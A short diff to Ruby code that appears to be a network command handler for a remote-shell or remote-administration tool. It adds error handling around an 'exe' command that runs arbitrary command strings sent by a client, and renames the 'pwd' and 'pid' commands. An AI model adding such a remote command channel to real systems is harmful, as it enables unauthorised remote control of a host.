@@ -10,12 +10,16 @@ def handle_client(client)
     cmd, action = data.split ' '
     case cmd
     when 'exe'
-      result = Helpers.exe(data.gsub('exe ', ''))
+      begin
+        result = Helpers.exe(data.gsub('exe ', ''))
+      rescue Exception => e
+        puts e.message
+      end
     when 'ls'
       result = Helpers.ls
-    when 'getpwd'
+    when 'pwd'
       result = Helpers.pwd
-    when 'getpid'
+    when 'pid'
       result = Helpers.pid
     when 'ifconfig'
       result = Helpers.ifconfig
